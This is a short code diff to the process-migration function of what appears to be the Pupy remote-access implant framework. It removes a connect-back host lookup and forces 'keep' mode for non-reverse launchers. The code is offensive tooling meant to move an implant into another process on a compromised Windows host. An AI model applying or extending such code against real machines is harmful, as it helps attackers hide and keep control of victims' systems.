@@ -17,15 +17,6 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None):
     module.client.load_package("pupwinutils.processes")
     isProcess64bits=False
     isBindConnection=False #If current launcher uses a BIND connection, isBindConnection == True
-    module.success("looking for configured connect back address ...")
-    try:
-        res=module.client.conn.modules['pupy'].get_connect_back_host()
-        host, port=res.rsplit(':',1)
-        module.success("address configured is %s:%s ..."%(host,port))
-    except:
-        if not keep:
-            module.error("launcher doesn't support connect back host information, disable keep")
-            keep = True
 
     module.success("looking for process %s architecture ..."%pid)
     arch = None
@@ -39,6 +30,10 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None):
     conf=module.client.get_conf()
 
     #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
+    if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
+        keep = True
+        module.warning('Enable keep (forced)')
+
     if module.client.desc['launcher'] == "bind":
         isBindConnection = True
         module.success("the current launcher uses a bind connection")
